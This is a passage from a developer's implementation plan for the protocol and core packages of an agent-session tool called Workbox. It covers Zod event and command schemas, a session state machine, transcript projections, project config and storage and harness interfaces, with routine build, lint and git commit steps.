  z.strictObject({ kind: z.literal('image'), attachmentId: sha256Schema }),
]);
const errorSchema = z.strictObject({ type: z.enum(ERROR_TYPES), message: z.string() });
const optionSchema = z.strictObject({ id: z.string(), label: z.string(), description: z.string().optional() });
const setupCommandResultSchema = z.strictObject({ command: z.string(), exitCode: z.int(), durationMs: z.int().nonnegative() });

// Payloads, one per spec 5.3 row; `id` is the entity for project, employee and session events,
// `sessionId` the session for everything else that belongs to a session.
'project.registered': z.strictObject({ id: idSchema, name: z.string().nonempty(), path: z.string().nonempty(), defaultBranch: z.string().nonempty() }),
'project.updated': z.strictObject({ id: idSchema, changes: z.strictObject({ name: z.string().nonempty().optional(), defaultBranch: z.string().nonempty().optional() }) }),
'project.removed': z.strictObject({ id: idSchema }),
'employee.created': employeeFieldsSchema,
'employee.updated': z.strictObject({ id: idSchema, changes: employeeFieldsSchema.omit({ id: true, projectId: true }).partial() }),
'session.created': z.strictObject({ id: idSchema, projectId: idSchema, employeeId: idSchema, title: z.string(), baseBranch: z.string().nonempty() }),
'session.status_changed': z.strictObject({ id: idSchema, from: z.enum(SESSION_STATUSES), to: z.enum(SESSION_STATUSES), reason: z.string() }),
'session.renamed': z.strictObject({ id: idSchema, title: z.string() }),
'session.archived': z.strictObject({ id: idSchema }),
'workspace.prepared': z.strictObject({ sessionId: idSchema, path: z.string(), branch: z.string(), setupCommandResults: z.array(setupCommandResultSchema) }),
'workspace.removed': z.strictObject({ sessionId: idSchema }),
'turn.started': z.strictObject({ sessionId: idSchema, turnId: idSchema, prompt: z.string(), attachmentIds: z.array(sha256Schema), queuedAt: isoTimestampSchema }),
'message.completed': z.strictObject({ sessionId: idSchema, turnId: idSchema, messageId: z.string(), role: z.enum(['assistant', 'user']), blocks: z.array(blockSchema), model: z.string() }),
'tool.started': z.strictObject({ sessionId: idSchema, turnId: idSchema, toolCallId: z.string(), name: z.string(), inputSummary: z.string(), category: z.enum(TOOL_CATEGORIES) }),
'tool.completed': z.strictObject({ sessionId: idSchema, turnId: idSchema, toolCallId: z.string(), outputSummary: z.string(), isError: z.boolean(), durationMs: z.int().nonnegative(), attachmentIds: z.array(sha256Schema) }),
'turn.completed': z.strictObject({ sessionId: idSchema, turnId: idSchema, stopReason: z.string(), durationMs: z.int().nonnegative() }),
'turn.failed': z.strictObject({ sessionId: idSchema, turnId: idSchema, error: errorSchema }),
'permission.requested': z.strictObject({ sessionId: idSchema, requestId: z.string(), toolCallId: z.string(), name: z.string(), input: z.string(), options: z.array(optionSchema).nonempty(), recommended: z.string(), reason: z.string() }),
'permission.resolved': z.strictObject({ sessionId: idSchema, requestId: z.string(), decision: z.enum(['allow', 'deny']), updatedInput: z.string().optional(), decidedBy: z.enum(DECIDED_BY), latencyMs: z.int().nonnegative() }),
'question.asked': z.strictObject({ sessionId: idSchema, requestId: z.string(), questions: z.array(z.strictObject({ id: z.string(), text: z.string(), options: z.array(optionSchema).nonempty(), recommended: z.string().optional() })).nonempty() }),
'question.answered': z.strictObject({ sessionId: idSchema, requestId: z.string(), answers: z.array(z.strictObject({ questionId: z.string(), optionId: z.string() })), decidedBy: z.enum(DECIDED_BY), latencyMs: z.int().nonnegative() }),
'harness.bound': z.strictObject({ sessionId: idSchema, harness: z.enum(HARNESS_IDS), harnessSessionId: z.string(), model: z.string(), tools: z.array(z.string()), skills: z.array(z.string()), version: z.string() }),
'harness.auth_status': z.strictObject({ harness: z.enum(HARNESS_IDS), kind: z.enum(['subscription', 'api_key', 'none']), plan: z.string().optional(), account: z.string().optional() }),
'harness.error': z.strictObject({ sessionId: idSchema, error: errorSchema }),
'context.compacted': z.strictObject({ sessionId: idSchema, tokensBefore: z.int().nonnegative(), tokensAfter: z.int().nonnegative(), trigger: z.string() }),
'subagent.started': z.strictObject({ sessionId: idSchema, subagentId: z.string(), name: z.string() }),
'subagent.stopped': z.strictObject({ sessionId: idSchema, subagentId: z.string(), outcome: z.string() }),
'usage.reported': z.strictObject({ sessionId: idSchema, turnId: idSchema, inputTokens: z.int().nonnegative(), outputTokens: z.int().nonnegative(), cacheReadTokens: z.int().nonnegative(), cacheCreationTokens: z.int().nonnegative(), costEstimateUsd: z.number().nonnegative(), model: z.string() }),
'rate_limit.reported': z.strictObject({ harness: z.enum(HARNESS_IDS), window: z.string(), utilisation: z.number().nonnegative().max(RATIO_MAX), resetsAt: isoTimestampSchema }),
'attachment.added': z.strictObject({ id: sha256Schema, sessionId: idSchema, mime: z.string(), bytes: z.int().nonnegative(), origin: z.enum(['user', 'agent']), name: z.string() }),
```

(`RATIO_MAX = 1` is a named constant in `usage.ts`.) `events/index.ts` assembles the catalogue:

```ts
export const EVENT_TYPES = [
  'project.registered', 'project.updated', 'project.removed', 'employee.created', 'employee.updated',
  'session.created', 'session.status_changed', 'session.renamed', 'session.archived',
  'workspace.prepared', 'workspace.removed',
  'turn.started', 'message.completed', 'tool.started', 'tool.completed', 'turn.completed', 'turn.failed',
  'permission.requested', 'permission.resolved', 'question.asked', 'question.answered',
  'harness.bound', 'harness.auth_status', 'harness.error', 'context.compacted', 'subagent.started', 'subagent.stopped',
  'usage.reported', 'rate_limit.reported', 'attachment.added',
] as const;
export type EventType = (typeof EVENT_TYPES)[number];

export const eventPayloads = {
  ...projectEventPayloads, ...sessionEventPayloads, ...conversationEventPayloads,
  ...decisionEventPayloads, ...harnessEventPayloads, ...usageEventPayloads,
} as const satisfies Record<EventType, z.ZodType>;

function eventMember<Type extends EventType>(type: Type) {
  return z.strictObject({ type: z.literal(type), v: z.literal(EVENT_SCHEMA_VERSION), payload: eventPayloads[type] });
}
```

The union member list is written explicitly, one `eventMember('<type>')` per line for all 30 types (decision: TypeScript cannot keep a tuple type through `EVENT_TYPES.map`, and the fixture test already fails when a type lacks a member). `newEventSchema` is the same list with each member `.extend({ sessionId: idSchema.optional(), source: z.enum(EVENT_SOURCES), sourceId: sourceIdSchema })`, wrapped in the session id rule; `eventEnvelopeSchema` extends the new-event members with `seq: z.int().nonnegative()` and `ts: isoTimestampSchema`, wrapped in the same rule. The rule is `function withSessionIdRule<Schema extends z.ZodType<SessionIdView>>(schema: Readonly<Schema>)`, returning `schema.refine(hasConsistentSessionId, { message })`, with `SessionIdView = { readonly type: string; readonly sessionId?: string | undefined; readonly payload: Readonly<Record<string, unknown>> }` (the `| undefined` is what `exactOptionalPropertyTypes` needs; this shape passed the re-review's lint and `tsc` probe); `hasConsistentSessionId` uses `SESSION_SCOPED_EVENT_TYPES` (every type whose payload has `sessionId`, plus the four `session.*` types whose `id` is the session) and requires: for a session-scoped type, `sessionId` present and equal to `payload.sessionId ?? payload.id`; for every other type (`project.*`, `employee.*`, `harness.auth_status`, `rate_limit.reported`), `sessionId` absent. `GLOBAL_EVENT_TYPES` names the two events that belong to no project. `transient.ts` declares `message.delta { sessionId, turnId, messageId, text }`, `thinking.delta { sessionId, turnId, text }`, `tool.progress { sessionId, turnId, toolCallId, text }` as a discriminated union on `type`. `Event`, `NewEvent`, `EventEnvelope`, `TransientFrame` and `EventPayload<T>` are `DeepReadonly<z.output<…>>`. Export everything from `index.ts`.

The envelope key `v` needs the root `.oxlintrc.json` option `"id-length": ["error", { "exceptions": ["z", "v"] }]` (the review's probe reproduced the report on `v` in event literals, tests included); add the ADR 0005 ledger row: `id-length` reconfigured, "`z` is Zod's conventional import name; `v` is the spec's envelope field for the event schema version". Change `user-config.ts` to `target: 'draft-07'` (the documented spelling; `'draft-7'` is a legacy alias).

- [ ] **Step 3: Fixtures and schema export**

Write one fixture per event type under `test/fixtures/events/<type>.json` (an envelope with realistic values; UUIDs with version and variant digits, ISO timestamps, envelope `sessionId` matching the payload). `scripts/export-schemas.ts` writes `schemas/workbox.events.schema.json` (`z.toJSONSchema(eventEnvelopeSchema, { target: 'draft-07', io: 'input' })`) and `schemas/workbox.user-config.schema.json` (`userConfigJsonSchema()`) with `JSON.stringify(value, undefined, 2)` and a trailing newline, using `node:fs/promises` and `import.meta.dir`. Because `packages/protocol/.oxlintrc.json` bans `node:*` for the whole package, add an override `{ "files": ["scripts/**"], "rules": { "no-restricted-imports": "off" } }` next to the existing `test/**` override, and the ADR 0005 ledger row: `no-restricted-imports` (`bun:*`, `node:*`) also off in protocol's `scripts/**`, "the schema export script writes files; it is not part of the runtime-neutral surface". Add `scripts` to protocol's `tsconfig.json` `include` and `scripts/**/*.ts` to its knip `project` and `entry`. The root `package.json` gets `"schemas": "bun run packages/protocol/scripts/export-schemas.ts && oxfmt schemas"` (decision for Minor 3: oxfmt formats the output, and the snapshot test compares parsed JSON, so the two never fight); `packages/protocol/package.json` gets `"schemas": "bun run scripts/export-schemas.ts"` for local use. Run `pnpm run schemas` once and commit the output. `packages/protocol/turbo.json` gets `"tasks": { "test": { "inputs": ["$TURBO_DEFAULT$", "$TURBO_ROOT$/schemas/**"] } }` so a schema change invalidates the cached test. Add `packages/protocol/bunfig.toml`:

```toml
[test]
coverage = true
coverageThreshold = 0.9
```

Add `utilisation` to `project-words.txt` (it appears in the fixture and the exported schema).

- [ ] **Step 4: Check and commit**

`bun test` in `packages/protocol` green with coverage at or above 90 %, `pnpm run check` green. Commit:

```bash
git add packages/protocol schemas .oxlintrc.json package.json knip.jsonc project-words.txt docs/adr
git commit -s -m "feat(protocol): add the event catalogue with contract fixtures and JSON Schema export"
```

---

### Task 2: Protocol: entities, commands and frames, session state machine

**Files:**
- Create: `packages/protocol/src/entities.ts`, `packages/protocol/src/frames.ts`, `packages/protocol/src/session-status.ts`
- Create: tests `packages/protocol/test/entities.test.ts`, `packages/protocol/test/frames.test.ts`, `packages/protocol/test/session-status.test.ts`, fixtures `packages/protocol/test/fixtures/commands/*.json` (one per client command) and `packages/protocol/test/fixtures/frames/*.json` (one per server frame)
- Modify: `packages/protocol/src/index.ts`, `packages/protocol/scripts/export-schemas.ts` (also export `schemas/workbox.frames.schema.json`), `packages/protocol/test/schema-snapshot.test.ts`

**Interfaces:**
- Produces in `entities.ts`: `projectSchema` (`{ id, name, path, defaultBranch, createdAt, updatedAt, removedAt? }`), `employeeSchema` (the employee fields plus `createdAt`, `updatedAt`), `sessionSchema` (`{ id, projectId, employeeId, title, baseBranch, workspace?: { path, branch }, status, harnessSessionId?, pendingRequest?: { requestId, kind: 'permission' | 'question' }, lastSeq, createdAt, updatedAt, archivedAt? }`), `branchSchema` (`{ name, local: boolean, remote?: string }`), `searchHitSchema` (`{ messageId, sessionId, snippet }`), the deep read-only types `Project`, `Employee`, `Session`, `Branch`, `SearchHit`, `PendingRequest`. Entities live in `protocol` so that the dashboard projection and the command results are typed without importing `core` (Minor 13).
- Produces in `frames.ts`: `clientCommandSchema` and `ClientCommand`, `ClientCommandType`, `serverFrameSchema` and `ServerFrame`, `ERROR_CODES`, `ErrorCode`, `partialMessageSchema` (`{ turnId, messageId, text, thinking }`) and `PartialMessage`, `commandResultSchemas` (one Zod schema per command type) and `parseCommandResult(type, result): ParseResult<CommandResult<type>>`, `COMMAND_ID_MAX_LENGTH`.
- Produces in `session-status.ts`: `SESSION_TRIGGERS`, `SessionTrigger`, `SESSION_TRANSITIONS` (readonly rows `{ from, trigger, to }`), `INITIAL_SESSION_STATUS` (`'creating'`), `transitionSession(status, trigger): TransitionResult` with `TransitionResult = { ok: true, to } | { ok: false, code: 'invalid_transition' }`, `isTurnEnded(status)`.
- Fixes applied: C2 (list commands), I3 (state machine amendments), Minor 7, 13, 14, and the review's Decision 11 (`isTurnEnded`).

- [ ] **Step 1: Failing tests**

`entities.test.ts` parses one literal per entity and rejects a session whose `status` is not in `SESSION_STATUSES`. `frames.test.ts` round-trips one fixture per command and per frame, rejects an unknown `type`, rejects a command without `commandId`, and checks `parseCommandResult('project.list', …)` accepts `{ projects: [] }` and rejects `{}`. `session-status.test.ts` is table-driven: a first table lists every defined row (below) and asserts `transitionSession(from, trigger)` equals `{ ok: true, to }`; a second table asserts that these undefined pairs return `{ ok: false, code: 'invalid_transition' }`: `('creating', 'prompt')`, `('idle', 'permission.resolved')`, `('idle', 'interrupt')`, `('completed', 'turn.completed')`, `('stopped', 'stop')`, `('waiting_for_permission', 'question.answered')`; a third asserts `isTurnEnded` is true for `completed`, `failed` and `stopped` only, and that `INITIAL_SESSION_STATUS` is `creating` and no row leads to `creating`.

- [ ] **Step 2: Implement**

`frames.ts`. Client commands, every one with `commandId: z.string().nonempty().max(COMMAND_ID_MAX_LENGTH)` (`COMMAND_ID_MAX_LENGTH = 100`), exactly spec 7.2 plus the two list commands of Decision 4:

| Command | Fields | Result (`commandResultSchemas`) |
|---|---|---|
| `subscribe` | `sinceSeq: z.int().nonnegative()`, `projectIds?: idSchema[]` | `{ lastSeq: number }` (sent after the backfill and the snapshots) |
| `project.register` | `path: string` | `{ projectId }` |
| `project.list` | none | `{ projects: Project[] }` |
| `project.branches` | `projectId` | `{ branches: Branch[] }` |
| `project.update` | `projectId`, `changes: { name?, defaultBranch? }` | `{}` |
| `employee.update` | `employeeId`, `changes` (the `employee.updated` changes shape) | `{}` |
| `session.create` | `projectId`, `employeeId?`, `title`, `baseBranch`, `prompt`, `attachmentIds: sha256[]` | `{ sessionId, employeeId }` |
| `session.list` | `projectId?`, `includeArchived?: boolean` | `{ sessions: Session[] }` |
| `session.prompt` | `sessionId`, `prompt`, `attachmentIds` | `{ turnId }` |
| `session.interrupt`, `session.stop`, `session.archive` | `sessionId` | `{}` |
| `session.search` | `query: z.string().nonempty()`, `sessionId?` | `{ hits: SearchHit[] }` |
| `permission.resolve` | `sessionId`, `requestId`, `decision: 'allow' | 'deny'`, `updatedInput?` | `{}` |
| `question.answer` | `sessionId`, `requestId`, `answers: { questionId, optionId }[]` | `{}` |

Server frames: `hello { protocolVersion, daemonVersion }`, `event { seq, event: eventEnvelopeSchema }`, `transient { frame: transientFrameSchema }`, `snapshot { sessionId, partial: partialMessageSchema }`, `ack { commandId, result: z.unknown() }`, `error { commandId?: string, code: z.enum(ERROR_CODES), message }` with `ERROR_CODES = ['bad_request', 'unauthorized', 'forbidden', 'not_found', 'invalid_transition', 'conflict', 'payload_too_large', 'sandbox', 'not_implemented', 'internal']` (the HTTP layer maps them in Task 12).

`session-status.ts` encodes the table as data, `SESSION_TRANSITIONS: readonly { from: SessionStatus; trigger: SessionTrigger; to: SessionStatus }[]`, with `SESSION_TRIGGERS = ['prepared', 'preparation_failed', 'prompt', 'permission.requested', 'permission.resolved', 'question.asked', 'question.answered', 'turn.completed', 'turn.failed', 'interrupt', 'stop']` and these rows (spec 5.2 plus Decision 12):

| From | Trigger | To |
|---|---|---|
| `creating` | `prepared` (workspace prepared and `start()` resolved) | `idle` |
| `creating` | `preparation_failed` | `failed` |
| `idle`, `completed`, `failed`, `stopped` | `prompt` | `running` |
| `running` | `permission.requested` | `waiting_for_permission` |
| `waiting_for_permission` | `permission.resolved` | `running` |
| `running` | `question.asked` | `waiting_for_answer` |
| `waiting_for_answer` | `question.answered` | `running` |
| `running` | `turn.completed` | `completed` |
| `running`, `waiting_for_permission`, `waiting_for_answer` | `turn.failed` | `failed` |
| `running`, `waiting_for_permission`, `waiting_for_answer` | `interrupt` | `idle` |
| every status except `stopped` | `stop` | `stopped` |

A session enters `creating` through `session.created` (the projection reducer sets `INITIAL_SESSION_STATUS`); no trigger leads there, and the doc comment on `INITIAL_SESSION_STATUS` says so. `transitionSession` looks the pair up in a `Map` keyed `${from}:${trigger}` built once from the rows. Extend the export script and the snapshot test for `schemas/workbox.frames.schema.json` (`z.toJSONSchema(serverFrameSchema, …)` and `clientCommandSchema` as two definitions in one file). Export everything from `index.ts`.

- [ ] **Step 3: Export, check, commit**

Regenerate with `pnpm run schemas`, `pnpm run check`, then:

```bash
git add packages/protocol schemas
git commit -s -m "feat(protocol): add entities, commands and frames and the session state machine"
```

---

### Task 3: Protocol: transcript and dashboard projections, project config, search highlights

**Files:**
- Create: `packages/protocol/src/projections/transcript.ts`, `packages/protocol/src/projections/dashboard.ts`, `packages/protocol/src/project-config.ts`, `packages/protocol/src/search.ts`
- Create: tests `packages/protocol/test/transcript.test.ts`, `dashboard.test.ts`, `project-config.test.ts`, `search.test.ts`, fixture `test/fixtures/sessions/happy-path.json` (an ordered list of envelopes for one session: created, status changes, turn.started, message.completed with a tool_use block, tool.started, tool.completed, permission.requested/resolved, turn.completed, usage.reported)
- Modify: `packages/protocol/src/index.ts`, `packages/protocol/scripts/export-schemas.ts` (also export `schemas/workbox.config.schema.json`, the project config, the name spec 5.6's example uses), `packages/protocol/test/schema-snapshot.test.ts`, `project-words.txt` (`summarise`)

**Interfaces:**
- Produces: `foldTranscript(events: readonly EventEnvelope[]): Transcript` with `Transcript = { sessionId: Id; turns: readonly Turn[]; messages: readonly Message[]; tools: readonly ToolCall[]; pending: readonly PendingDecision[]; usage: UsageTotals }`, `Turn = { turnId, prompt, attachmentIds, startedAt, outcome: 'running' | 'completed' | 'failed' | 'interrupted' | 'stopped', stopReason?, error?, durationMs? }`, `Message = { messageId, turnId, role, blocks, model, seq }`, `ToolCall = { toolCallId, turnId, name, inputSummary, category, startedSeq, completed?: { outputSummary, isError, durationMs, attachmentIds } }`, `PendingDecision = { kind: 'permission' | 'question', requestId, seq, event }`, `UsageTotals = { inputTokens, outputTokens, cacheReadTokens, cacheCreationTokens, costEstimateUsd, turns }`; `summariseDashboard(sessions: readonly Session[]): DashboardGroups` with `DashboardGroups = { waiting: readonly Session[]; running: readonly Session[]; done: readonly Session[]; attention: readonly Session[] }` and `dashboardGroupOf(status)`; `projectConfigSchema`, `ProjectConfig`, `parseProjectConfig(input): ParseResult<ProjectConfig>`, `DEFAULT_PROJECT_CONFIG`, `mergeProjectConfig(base, localOverride)`, `projectConfigJsonSchema()`; `SEARCH_HIGHLIGHT_START` (`'\u{E000}'`), `SEARCH_HIGHLIGHT_END` (`'\u{E001}'`), `splitHighlights(snippet): readonly { text: string; highlighted: boolean }[]`.
- Fixes applied: Minor 1, 16, 17 (usage totals; `maxTurns` and `maxBudgetUsd` keys), 18.

- [ ] **Step 1: Failing tests**

`transcript.test.ts` folds `fixtures/sessions/happy-path.json` and asserts the turn, message, tool and decision structure and the usage totals; folds the same list with the `tool.completed` removed and asserts the tool has no `completed`; with the `permission.resolved` removed and asserts a `pending` decision; and folds a list where a turn is open and a `session.status_changed` to `idle` (reason `interrupted`) follows and asserts the turn's `outcome` is `interrupted` and `pending` is empty (the same for `stopped` and `failed`). It also proves that events given out of order are sorted by `seq` first. `dashboard.test.ts` asserts the grouping for one session per status (`waiting_*` → `waiting`; `running` and `creating` → `running`; `completed` → `done`; `idle`, `failed`, `stopped` → `attention`). `project-config.test.ts` mirrors `user-config.test.ts`: defaults, unknown key named, `$schema` allowed, local override merged over the committed config (arrays replaced, objects merged one level deep), the `bashDeny` regexes compile, `ANTHROPIC_API_KEY` absent from the default passthrough. `search.test.ts` splits a snippet with two highlights and one with none.

- [ ] **Step 2: Implement**

Projections are pure functions over `readonly EventEnvelope[]`, sorted defensively by `seq` first. `foldTranscript` closes an open turn when a `session.status_changed` arrives with `to` of `idle` (`interrupted`), `stopped` or `failed` (if no `turn.failed` closed it), and clears `pending` at the same time (Minor 18). `project-config.ts` follows `user-config.ts`'s `.default(() => schema.parse({}))` pattern with the fields of spec 5.6: `defaultBranch: z.string().nonempty().optional()` (absent means detect from git), `workspace.branchPrefix` default `workbox/`, `workspace.setupCommands` default `[]`, `employees` default `[]` with the appearance schema from Task 1 (`name` required, `gender` default `other`, the rest optional and filled from the harness defaults at registration), `harness.claude` with `model` (default `''`), `effort` (default `medium`), `permissionMode` (default `acceptEdits`), `allowedTools` (default `[]`), `maxTurns: z.int().positive().optional()` and `maxBudgetUsd: z.number().positive().optional()` (enforced in plan 4), `permissions.bashAllow/bashDeny/webFetchAllow` with the spec's defaults, `env.passthrough` default `['PATH', 'HOME', 'LANG', 'LC_ALL']` (Decision 7). `search.ts` defines the two private-use marker characters that FTS5 `snippet()` wraps matches in (Task 8) and `splitHighlights`; plan 3 renders the segments as text, so no HTML from a message body ever reaches the DOM unescaped.

- [ ] **Step 3: Export, check, commit**

Regenerate the schemas, `pnpm run check`, then:

```bash
git add packages/protocol schemas project-words.txt
git commit -s -m "feat(protocol): add the transcript and dashboard projections and the project config"
```

---

### Task 4: Core: domain, ports, in-memory store and the shared store suite

**Files:**
- Create: `packages/core/package.json` (`exports`: `.` and `./testing`), `packages/core/turbo.json` (`"tags": ["core"]`), `packages/core/tsconfig.json` (copy `packages/protocol/tsconfig.json`), `packages/core/.oxlintrc.json` (extends the root; protocol's bans plus the `test/**` override and a `src/testing/**` override), `packages/core/bunfig.toml` (coverage 0.9)
- Create: `packages/core/src/index.ts`, `src/domain.ts`, `src/ports.ts`, `src/errors.ts`, `src/projection-state.ts`, `src/source-ids.ts`, `src/testing/index.ts`, `src/testing/memory-event-store.ts`, `src/testing/event-store-suite/{index,append,read,projections,blobs}.ts` (`index.ts` composes `describeEventStore` from one file per concern, so each stays under 300 lines), `src/testing/ids.ts` (`testId`, `createSequenceIds`), `src/testing/manual-clock.ts`, `src/testing/recording-logger.ts`
- Create: `packages/core/test/memory-event-store.test.ts` (runs `describeEventStore`), `packages/core/test/projection-state.test.ts`, `packages/core/test/source-ids.test.ts`
- Modify: `knip.jsonc` (workspace entry for `packages/core`), `pnpm-lock.yaml`, `docs/adr/0005-…md` (ledger rows for the nested config and the `src/testing/**` override; the sentence naming the packages with a nested config is rewritten once, in Task 17, when all four exist)

**Interfaces:**
- Produces in `ports.ts` (every function is a `readonly` property; every parameter type is deep read-only):

```ts
export interface Clock { readonly now: () => Date }
export interface IdGenerator { readonly next: () => Id }
export type LogProperties = Readonly<Record<string, unknown>>;
export interface Logger {
  readonly debug: (message: string, properties?: LogProperties) => void;
  readonly info: (message: string, properties?: LogProperties) => void;
  readonly warning: (message: string, properties?: LogProperties) => void;
  readonly error: (message: string, properties?: LogProperties) => void;
}
export type Unsubscribe = () => void;
export interface EventFilter { readonly sessionId?: Id; readonly projectIds?: readonly Id[] }
/** One input of `append`: the stored envelope, whether this call inserted it, and the project it belongs to (absent for global events). */
export interface AppendedEvent { readonly envelope: EventEnvelope; readonly inserted: boolean; readonly projectId?: Id }
export type EventListener = (appended: readonly AppendedEvent[]) => void;
export interface SessionFilter { readonly projectId?: Id; readonly includeArchived?: boolean }
export interface EventStore {
  /** One transaction; a `sourceId` already stored yields `inserted: false` with the stored envelope. */
  readonly append: (events: readonly NewEvent[]) => Promise<readonly AppendedEvent[]>;
  /** Called synchronously after each committed append with the inserted envelopes only, in `seq` order. A listener that throws is logged at `error` and affects neither `append` nor the other listeners. */
  readonly subscribe: (listener: EventListener) => Unsubscribe;
  /** Events with `seq` greater than `seq`, at most `limit` (default `READ_PAGE_LIMIT`, 500); global events pass every project filter. */
  readonly readSince: (seq: number, filter?: EventFilter, limit?: number) => Promise<readonly EventEnvelope[]>;
  readonly readSession: (sessionId: Id) => Promise<readonly EventEnvelope[]>;
  readonly lastSeq: () => Promise<number>;
  readonly projects: (options?: { readonly includeRemoved?: boolean }) => Promise<readonly Project[]>;
  readonly project: (projectId: Id) => Promise<Project | undefined>;
  readonly employees: (projectId?: Id) => Promise<readonly Employee[]>;
  readonly sessions: (filter?: SessionFilter) => Promise<readonly Session[]>;
  readonly session: (sessionId: Id) => Promise<Session | undefined>;
  readonly search: (query: string, sessionId?: Id) => Promise<readonly SearchHit[]>;
  readonly close: () => Promise<void>;
}
export interface BlobIndex {
  readonly record: (meta: BlobMeta) => Promise<void>;
  readonly lookup: (sha256: string) => Promise<BlobMeta | undefined>;
}
export interface EventSink { readonly event: (event: NewEvent) => void; readonly transient: (frame: TransientFrame) => void }
export interface HarnessAdapter {
  readonly id: HarnessId;
  readonly describe: () => HarnessInfo;
  readonly authStatus: () => Promise<AuthStatus>;
  /** Resolves once the session accepts prompts; `harness.bound` is emitted through the sink when the harness reports its identity (the fake: inside `start`; Claude: on the SDK's init message, plan 4). */
  readonly start: (spec: HarnessSessionSpec, sink: EventSink) => Promise<HarnessSession>;
}
export interface HarnessSession {
  /** Resolves when the turn has been accepted (queued or started), never at turn end; completion arrives through the sink as `turn.completed` or `turn.failed`. */
  readonly prompt: (turn: TurnInput) => Promise<void>;
  readonly resolvePermission: (requestId: string, decision: PermissionDecision) => void;
  readonly answerQuestion: (requestId: string, answer: QuestionAnswer) => void;
  readonly interrupt: () => Promise<void>;
  readonly stop: () => Promise<void>;
  readonly contextUsage: () => Promise<ContextUsage>;
}
export interface SandboxProvider {
  readonly capabilities: () => SandboxCapabilities;
  readonly prepare: (spec: WorkspaceSpec) => Promise<PreparedWorkspace>;
  readonly spawn: (workspace: Workspace, spec: SpawnSpec) => Promise<SandboxedProcess>;
  readonly dispose: (workspace: Workspace) => Promise<void>;
  readonly detectDefaultBranch: (projectPath: string) => Promise<string>;
  readonly listBranches: (projectPath: string) => Promise<readonly Branch[]>;
  /** The daemon's environment filtered through the allowlist, for a harness started without a fresh `prepare` (resume, restart, a prompt after `stop`). */
  readonly environment: (envPassthrough: readonly string[]) => Readonly<Record<string, string>>;
}
export interface ProjectConfigSource { readonly read: (projectPath: string) => Promise<ParseResult<ProjectConfig>> }
```

- Produces in `domain.ts` (re-exporting `Project`, `Employee`, `Session`, `Branch`, `SearchHit`, `PendingRequest` from `protocol` and adding): `Workspace { path, branch }`, `HarnessInfo { version: string; capabilities: { resume: boolean; fork: boolean; steer: boolean }; models: readonly string[]; efforts: readonly string[] }`, `AuthStatus { kind: 'subscription' | 'api_key' | 'none'; plan?: string; account?: string }`, `EmployeeRuntimeConfig { model, effort, permissionMode, allowedTools: readonly string[], systemPromptAppend }`, `HarnessSessionSpec { sessionId, cwd, workspace, employee: EmployeeRuntimeConfig, resumeId?, env: Readonly<Record<string, string>>, spawn: SandboxProvider['spawn'] }`, `TurnInput { turnId, prompt, attachmentIds }`, `PermissionDecision { decision: 'allow' | 'deny'; updatedInput?: string }`, `QuestionAnswer { answers: readonly { questionId; optionId }[] }`, `ContextUsage { inputTokens: number; maxTokens: number }` (tokens currently in the context window and the window size), `WorkspaceSpec { projectId, sessionId, projectPath, baseBranch, branch, setupCommands: readonly string[], envPassthrough: readonly string[] }`, `PreparedWorkspace { workspace, setupCommandResults, env }` (`env` already filtered through the allowlist, so the runtime can hand it to `HarnessSessionSpec.env`), `SpawnSpec { command: readonly string[]; cwd?: string; env: Readonly<Record<string, string>>; stdio?: 'pipe' | 'ignore' }`, `SandboxedProcess { pid: number; exited: Promise<number>; kill: (signal?: 'SIGKILL') => void; stdin?: WritableStream<Uint8Array>; stdout?: ReadableStream<Uint8Array>; stderr?: ReadableStream<Uint8Array> }` (streams present with `stdio: 'pipe'`, which is the default), `SandboxCapabilities { isolation: 'host'; network: 'unrestricted' }`, `BlobMeta { sha256, mime, bytes, name, createdAt }`, `PartialSnapshot { sessionId, projectId, partial: PartialMessage }`. `errors.ts`: `class WorkboxError extends Error { readonly code: ErrorCode; readonly details: Readonly<Record<string, unknown>> }` constructed as `new WorkboxError(code, message, details?)`.
- `projection-state.ts`: `ProjectionState` (maps of projects, employees, sessions by id), `emptyProjectionState()`, `applyProjection(state, envelope): ProjectionState` (the one reducer both stores use) and `projectIdOf(state, event): Id | undefined` (`session.*` events through the payload's `projectId` or the session map; `workspace.*`, `turn.*`, `message.*`, `tool.*`, `permission.*`, `question.*`, `harness.bound`, `harness.error`, `context.compacted`, `subagent.*`, `usage.reported`, `attachment.added` through the session map; `project.*` through `payload.id`; `employee.created` through `payload.projectId`, `employee.updated` through the employee map; global types undefined). Reducer rules: `session.created` creates the row with `status: INITIAL_SESSION_STATUS`; `session.status_changed` sets `status` and clears `pendingRequest` unless `to` is a `waiting_*` status; `permission.requested` and `question.asked` set `pendingRequest`; `permission.resolved` and `question.answered` clear it; `workspace.prepared` sets `workspace`, `workspace.removed` clears it; `harness.bound` sets `harnessSessionId`; `session.renamed`, `session.archived` (sets `archivedAt`); `project.removed` sets `removedAt` (the row stays, so foreign keys hold, Minor 20); every event with a session sets that session's `lastSeq` and `updatedAt`.
- `source-ids.ts`: `userSourceId(commandId, index)`, `blobSourceId(sessionId, sha256)`, `statusSourceId(causeSourceId)`, `systemSourceId(id)` producing the convention of the Global Constraints, and `userSource(commandId): CommandSource` with `CommandSource = { readonly commandId: string; readonly next: () => string }` yielding `user:<commandId>:1`, `:2`, … so that the Workbox and a runtime share one counter per command.
- `testing/`: `createMemoryEventStore({ clock, logger }): MemoryEventStore` implementing `EventStore` and `BlobIndex` with arrays and maps, the shared reducer, a naive `includes` search that wraps matches in the protocol's highlight markers, and synchronous listener notification after each append; `describeEventStore(name, factory)` where `factory: () => Promise<{ store: EventStore & BlobIndex; clock: ManualClock; logger: RecordingLogger; cleanup: () => Promise<void> }>` (the suite inspects `logger.records` for the listener case, R2-6); `createRecordingLogger(): RecordingLogger`, a `Logger` that keeps `{ level, message, properties }` in `records`; `testId(index)`, `createSequenceIds()` (an `IdGenerator` yielding `testId(1)`, `testId(2)`, …), `createManualClock(startIso)` with `now()`, `advance(ms)`.
- Fixes applied: C1 (subscription), I1 (a, b, h), I4 (ports), I6 (project id, global events), I7 (`inserted`), Minor 11, 13, 20, 21; re-review I3 (`environment`), N2 and Minors 9, 17, 18 and 23.

- [ ] **Step 1: Failing tests**

